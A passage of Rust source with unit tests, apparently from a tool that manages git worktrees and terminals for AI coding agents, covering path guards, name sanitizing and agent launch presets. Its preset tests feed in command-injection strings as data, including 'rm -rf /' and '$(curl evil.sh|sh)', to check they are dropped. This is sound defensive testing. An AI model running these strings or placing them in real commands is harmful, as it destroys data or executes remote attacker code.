        self.inventory.refresh().await;
        let mut out = Vec::new();
        for ws in self.list_workspaces()? {
            out.push(self.workspace_view(&ws).await?);
        }
        Ok(out)
    }
}

fn to_record(t: &models::Terminal) -> derive::TerminalRecord {
    derive::TerminalRecord {
        id: t.id,
        workspace_id: t.workspace_id,
        intent: t.intent,
        runtime_confirmed: t.runtime_confirmed,
        exit_code: t.exit_code,
        exit_signal: t.exit_signal,
        loss_dismissed: t.loss_dismissed,
    }
}

fn terminal_update(
    t: &models::Terminal,
    f: impl FnOnce(&mut models::TerminalUpdate),
) -> models::TerminalUpdate {
    let mut u = models::TerminalUpdate {
        title: t.title.clone(),
        command_preset: t.command_preset.clone(),
        intent: t.intent,
        runtime_confirmed: t.runtime_confirmed,
        exit_code: t.exit_code,
        exit_signal: t.exit_signal,
        loss_dismissed: t.loss_dismissed,
        lease_generation: t.lease_generation,
        epoch: t.epoch,
        columns: t.columns,
        rows: t.rows,
    };
    f(&mut u);
    u
}

/// Refuse `/`, a home directory root, and system directories.
fn reject_sensitive_root(path: &Path) -> Result<()> {
    let s = path.to_string_lossy();
    let sensitive = s == "/"
        || s.starts_with("/System")
        || s.starts_with("/Library")
        || s.starts_with("/usr")
        || s.starts_with("/bin")
        || s.starts_with("/sbin")
        || s.starts_with("/etc")
        || s.starts_with("/var");

    if sensitive {
        return Err(DomainError::PathNotAllowed);
    }

    if let Some(home) = std::env::var_os("HOME")
        && Path::new(&home) == path
    {
        return Err(DomainError::PathNotAllowed);
    }
    Ok(())
}

fn sanitize(s: &str) -> String {
    s.chars()
        .map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '-' })
        .collect()
}

fn now_millis() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/// Derive a stable UUID from the install id so the daemon identity survives
/// restarts and previously written tags remain provable.
pub(crate) fn stable_host_id(install_id: &str) -> Uuid {
    let mut bytes = [0u8; 16];
    for (i, b) in install_id.as_bytes().iter().enumerate() {
        bytes[i % 16] ^= *b;
    }
    Uuid::from_bytes(bytes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn presets_run_through_an_interactive_login_shell() {
        // Startup files, version managers, direnv and aliases must behave like a
        // hand-launched terminal.
        // Quoted now, because a preset may carry a model.
        assert!(preset_command("claude", None).contains("-ilc 'claude'"));
        assert!(preset_command("shell", None).ends_with("-il"));
        assert!(preset_command("cursor", None).contains("cursor-agent"));
    }

    #[test]
    fn sensitive_roots_are_refused() {
        for p in ["/", "/System/Library", "/usr/local", "/etc"] {
            assert!(
                reject_sensitive_root(Path::new(p)).is_err(),
                "{p} should be refused as a repository root"
            );
        }
    }

    #[test]
    fn the_home_directory_itself_is_refused() {
        if let Some(home) = std::env::var_os("HOME") {
            assert!(reject_sensitive_root(Path::new(&home)).is_err());
            // but a project directory inside it is fine
            let inside = Path::new(&home).join("Dev");
            assert!(reject_sensitive_root(&inside).is_ok());
        }
    }

    #[test]
    fn host_id_is_stable_for_an_install() {
        assert_eq!(stable_host_id("abc123"), stable_host_id("abc123"));
        assert_ne!(stable_host_id("abc123"), stable_host_id("def456"));
    }

    #[test]
    fn sanitize_keeps_paths_predictable() {
        assert_eq!(sanitize("my repo/name"), "my-repo-name");
        assert_eq!(sanitize("ok_name-1"), "ok_name-1");
    }

    /// A service backed by its own throwaway database.
    ///
    /// `keep` rather than letting the `TempDir` drop: the guard would delete
    /// the directory the instant this function returns, before the caller
    /// ever opens it.
    async fn temp_service() -> Service {
        let dir = tempfile::tempdir().unwrap().keep();
        Service::open_in(dir).await.unwrap()
    }

    /// A workspace whose worktree is a real, empty directory a test can write
    /// into — everything `search_worktree_files` needs and nothing tmux or git
    /// would add, since this is a store-level fixture rather than a live one.
    async fn seed_workspace(service: &Service) -> models::Workspace {
        let worktree = tempfile::tempdir().unwrap().keep();
        let root = service
            .store
            .create_repository_root(service.host_id, "/tmp/worktree-search-root", now_millis())
            .unwrap();
        let repo = service
            .store
            .create_repository(service.host_id, root.id, "repo", "/tmp/worktree-search-root/.git", "")
            .unwrap();
        service
            .store
            .create_workspace(repo.id, "task", "branch", &worktree.display().to_string())
            .unwrap()
    }

    #[tokio::test]
    async fn worktree_search_finds_a_file_that_git_has_never_seen() {
        // The @-mention case that matters: the file the agent just created.
        let service = temp_service().await;
        let ws = seed_workspace(&service).await;
        std::fs::write(
            std::path::Path::new(&ws.worktree_path).join("brand_new.rs"),
            "fn main() {}",
        )
        .unwrap();
        let hits = service.search_worktree_files(ws.id, "brand", 10).await.unwrap();
        assert_eq!(hits, vec!["brand_new.rs".to_string()]);
    }

    #[tokio::test]
    async fn worktree_search_never_offers_the_git_directory() {
        let service = temp_service().await;
        let ws = seed_workspace(&service).await;
        let git_dir = std::path::Path::new(&ws.worktree_path).join(".git");
        std::fs::create_dir_all(&git_dir).unwrap();
        std::fs::write(git_dir.join("HEAD"), "ref: refs/heads/main").unwrap();
        let hits = service.search_worktree_files(ws.id, "", 500).await.unwrap();
        assert!(!hits.iter().any(|p| p.starts_with(".git/")), "{hits:?}");
    }
}

#[cfg(test)]
mod preset_tests {
    use super::*;

    #[test]
    fn a_bare_preset_runs_the_agent() {
        assert!(preset_command("claude", None).contains("'claude'"));
        assert!(preset_command("codex", None).contains("'codex'"));
        assert!(preset_command("cursor", None).contains("'cursor-agent'"));
        assert!(preset_command("shell", None).ends_with("-il"));
    }

    #[test]
    fn a_model_is_passed_through() {
        assert!(preset_command("claude:opus", None).contains("claude --model opus"));
        assert!(preset_command("codex:gpt-5.6-sol", None).contains("codex --model gpt-5.6-sol"));
    }

    #[test]
    fn a_model_that_is_not_an_identifier_is_dropped_not_escaped() {
        // This string reaches a `-ilc` argument. Dropping it loses nothing real
        // and leaves no argument about quoting.
        let out = preset_command("claude:opus'; rm -rf /; '", None);
        assert!(!out.contains("rm -rf"));
        assert!(out.contains("'claude'"));
    }

    #[test]
    fn an_unrecognised_preset_that_is_not_an_identifier_runs_nothing() {
        let out = preset_command("$(curl evil.sh|sh)", None);
        assert!(!out.contains("curl"));
        assert!(out.ends_with("-il"), "falls back to a plain shell");
    }

    #[test]
    fn a_custom_agent_name_still_works() {
        // Presets are not a closed set: someone's own wrapper should run.
        assert!(preset_command("aider", None).contains("'aider'"));
        assert!(preset_command("aider:sonnet", None).contains("aider --model sonnet"));
    }

    #[test]
    fn a_claude_terminal_is_launched_with_the_session_id_we_chose() {
        // So that switching this pane to agent mode later is a lookup rather
        // than a guess about which of several .jsonl files is ours.
        let cmd = preset_command("claude", Some("018f5b2c-0000-7000-8000-000000000000"));
        assert!(cmd.contains("--session-id 018f5b2c-0000-7000-8000-000000000000"), "{cmd}");
    }

    #[test]
    fn a_shell_is_not_given_a_session_id() {
        let cmd = preset_command("shell", Some("018f5b2c-0000-7000-8000-000000000000"));
        assert!(!cmd.contains("--session-id"), "{cmd}");
    }

    #[test]
    fn a_session_id_that_is_not_a_uuid_is_dropped_rather_than_escaped() {
        // It ends up inside a `-ilc` string. The existing rule for models
        // applies here for the same reason.
        let cmd = preset_command("claude", Some("; rm -rf /"));
        assert!(!cmd.contains("rm -rf"), "{cmd}");
        assert!(!cmd.contains("--session-id"), "{cmd}");
    }
}


/// A path in its canonical form, or unchanged when it cannot be resolved.
///
/// Comparing worktree paths by string alone would offer an already-registered
/// worktree as new whenever git and the database spelled the same directory
/// differently — a symlinked home, a trailing slash, `/var` against
/// `/private/var`. A path that no longer exists cannot be canonicalised, and
/// falling back to the raw string keeps it comparable with itself.
fn canonical_or_raw(path: &str) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| PathBuf::from(path))
}
